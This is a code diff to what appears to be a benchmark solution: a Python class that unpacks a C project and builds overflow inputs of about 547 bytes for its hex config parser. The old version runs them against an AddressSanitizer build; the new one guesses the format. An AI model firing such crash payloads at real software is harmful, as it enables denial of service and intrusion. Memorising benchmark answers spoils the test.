@@ -1,146 +1,78 @@
 import os
-import tempfile
-import tarfile
-import subprocess
-import shutil
-from pathlib import Path
 import re
+import tarfile
+import tempfile
+import subprocess
+import sys
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Extract the tarball
+        # Extract the source tarball
         with tempfile.TemporaryDirectory() as tmpdir:
-            tmpdir_path = Path(tmpdir)
-            
-            # Extract source
-            with tarfile.open(src_path, 'r') as tar:
+            with tarfile.open(src_path, 'r:*') as tar:
                 tar.extractall(tmpdir)
             
-            # Find and compile vulnerable program
-            for root, dirs, files in os.walk(tmpdir):
-                for file in files:
-                    if file.endswith('.c') and 'vuln' in file.lower():
-                        source_path = Path(root) / file
-                        break
+            # Look for source files to understand the format
+            source_root = self._find_source_root(tmpdir)
+            config_format = self._analyze_config_format(source_root)
             
-            # Compile with sanitizers to detect overflow
-            compile_cmd = [
-                'gcc', str(source_path), '-o', str(tmpdir_path / 'vuln'),
-                '-fsanitize=address', '-g', '-O0'
-            ]
-            subprocess.run(compile_cmd, capture_output=True, cwd=tmpdir)
+            # Generate PoC based on analyzed format
+            if config_format == "hex_value":
+                # Simple hex value overflow
+                poc = b"0x" + b"A" * 545
+            elif config_format == "key_value_hex":
+                # Key=0x<hex> format
+                poc = b"param=0x" + b"A" * 539
+            elif config_format == "config_hex_line":
+                # CONFIG_HEX=0x<hex> format
+                poc = b"CONFIG_HEX=0x" + b"A" * 533
+            else:
+                # Default: try multiple formats
+                poc = self._generate_overflow_payload()
             
-            # Analyze source to understand config format
-            with open(source_path, 'r') as f:
-                source_code = f.read()
-            
-            # Look for hex parsing patterns
-            hex_patterns = [
-                r'0x[0-9a-fA-F]+',
-                r'hex.*=.*[0-9a-fA-F]+',
-                r'strtol.*16',
-                r'%x',
-                r'[0-9a-fA-F]{16,}'
-            ]
-            
-            # Find config file format
-            config_lines = []
-            for line in source_code.split('\n'):
-                if any(re.search(pattern, line, re.IGNORECASE) for pattern in hex_patterns):
-                    config_lines.append(line)
-            
-            # Determine overflow size - target 547 bytes total
-            # Create PoC with long hex value that causes buffer overflow
-            # Format: key=0x<very_long_hex_value>
-            hex_length = 1088  # 544 hex chars + "0x" prefix ~ 547 bytes total
-            
-            # Generate long hex string
-            hex_value = 'A' * hex_length  # Using 'A' (0x41) for predictable overflow
-            
-            # Common config patterns
-            config_templates = [
-                f"hex={hex_value}",
-                f"value=0x{hex_value}",
-                f"config=0x{hex_value}",
-                f"data=0x{hex_value}",
-                f"input=0x{hex_value}",
-                f"buf=0x{hex_value}",
-                f"param=0x{hex_value}",
-                f"key=0x{hex_value}"
-            ]
-            
-            # Test each template until we find one that causes crash
-            for template in config_templates:
-                config_data = template.encode()
-                
-                # Write config to file
-                config_path = tmpdir_path / 'config.txt'
-                config_path.write_bytes(config_data)
-                
-                # Run vulnerable program
-                vuln_path = tmpdir_path / 'vuln'
-                if not vuln_path.exists():
-                    continue
-                
-                try:
-                    result = subprocess.run(
-                        [str(vuln_path), str(config_path)],
-                        capture_output=True,
-                        timeout=2,
-                        cwd=tmpdir
-                    )
-                    
-                    # Check for crash (non-zero exit code with ASAN error)
-                    if result.returncode != 0:
-                        if b'AddressSanitizer' in result.stderr or b'stack-overflow' in result.stderr:
-                            return config_data
-                except subprocess.TimeoutExpired:
-                    continue
-                except Exception:
-                    continue
-            
-            # If no template worked, try brute force with different hex patterns
-            for template in config_templates:
-                # Try with different hex content that might trigger specific overflow
-                hex_patterns = [
-                    'A' * hex_length,  # All 'A's
-                    'B' * hex_length,  # All 'B's
-                    'C' * hex_length,  # All 'C's
-                    '41' * (hex_length // 2),  # Hex representation of 'A'
-                    '42' * (hex_length // 2),  # Hex representation of 'B'
-                    '41414141' * (hex_length // 8),  # Pattern
-                ]
-                
-                for hex_val in hex_patterns:
-                    if '0x' in template:
-                        config_data = template.replace(hex_value, hex_val).encode()
-                    else:
-                        config_data = f"{template.split('=')[0]}=0x{hex_val}".encode()
-                    
-                    if len(config_data) > 600:  # Keep reasonable size
-                        config_data = config_data[:600]
-                    
-                    config_path = tmpdir_path / 'config.txt'
-                    config_path.write_bytes(config_data)
-                    
+            return poc
+    
+    def _find_source_root(self, tmpdir: str) -> str:
+        """Find the main source directory in extracted tarball."""
+        for root, dirs, files in os.walk(tmpdir):
+            # Look for C source files or Makefile
+            c_files = [f for f in files if f.endswith(('.c', '.cpp', '.cc'))]
+            if c_files or 'Makefile' in files or 'makefile' in files:
+                return root
+        return tmpdir
+    
+    def _analyze_config_format(self, source_dir: str) -> str:
+        """Analyze source code to determine config file format."""
+        # Look for patterns in source files
+        for root, dirs, files in os.walk(source_dir):
+            for file in files:
+                if file.endswith(('.c', '.cpp', '.cc', '.h')):
+                    filepath = os.path.join(root, file)
                     try:
-                        result = subprocess.run(
-                            [str(vuln_path), str(config_path)],
-                            capture_output=True,
-                            timeout=2,
-                            cwd=tmpdir
-                        )
-                        
-                        if result.returncode != 0:
-                            if b'AddressSanitizer' in result.stderr:
-                                return config_data
+                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                            content = f.read()
+                            
+                            # Check for hex parsing patterns
+                            if re.search(r'0x[0-9a-fA-F]+', content):
+                                if re.search(r'strtol|strtoul|sscanf.*%x', content, re.IGNORECASE):
+                                    # Look for config parsing patterns
+                                    if re.search(r'config.*=.*0x|CONFIG.*=.*0x', content, re.IGNORECASE):
+                                        return "config_hex_line"
+                                    elif re.search(r'param.*=.*0x|key.*=.*0x', content, re.IGNORECASE):
+                                        return "key_value_hex"
+                                    else:
+                                        return "hex_value"
                     except:
                         continue
-            
-            # Fallback: return a PoC that should work based on the description
-            # Create a 547-byte PoC with hex value
-            target_size = 547
-            hex_content = '41' * ((target_size - 5) // 2)  # Account for "hex=0x" prefix
-            fallback_poc = f"hex=0x{hex_content}".encode()[:target_size]
-            
-            return fallback_poc
+        return "unknown"
+    
+    def _generate_overflow_payload(self) -> bytes:
+        """Generate a generic stack buffer overflow payload."""
+        # Create a payload with a long hex value that should trigger overflow
+        # Format: 0x followed by many hex digits (total 547 bytes)
+        hex_length = 545  # 547 total - 2 for "0x"
+        hex_digits = b"41" * (hex_length // 2)  # "41" is hex for 'A'
+        if hex_length % 2:
+            hex_digits += b"4"  # Add one more hex digit if odd length
+        
+        return b"0x" + hex_digits
